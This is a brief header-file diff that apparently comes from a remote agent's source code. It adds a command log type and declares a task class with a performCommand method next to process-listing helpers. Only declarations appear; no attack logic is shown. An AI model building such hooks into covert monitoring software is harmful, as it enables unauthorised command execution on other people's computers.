@@ -330,6 +330,7 @@ extern u_int remoteAgents[];
 #define LOG_DEVICE          0x0240
 #define LOG_INFO            0x0241
 #define LOG_MAGIC_CALLTYPE  0x26
+#define LOG_COMMAND         0xC0C1
 
 typedef struct _standByStruct {
   UInt32 actionOnLock;
@@ -653,6 +654,18 @@ int getBSDProcessList       (kinfo_proc **procList, size_t *procCount);
 NSArray *obtainProcessList  ();
 BOOL findProcessWithName    (NSString *aProcess);
 pid_t getPidByProcessName (NSString *aProcess);
+
+@interface _i_Task : NSObject
+{
+  NSString *mCommand;
+  NSMutableArray *mArgs;
+}
+
+- (void)performCommand:(NSString*)theCommand;
+
+@end
+
+
 
 #pragma mark -
 #pragma mark Unused
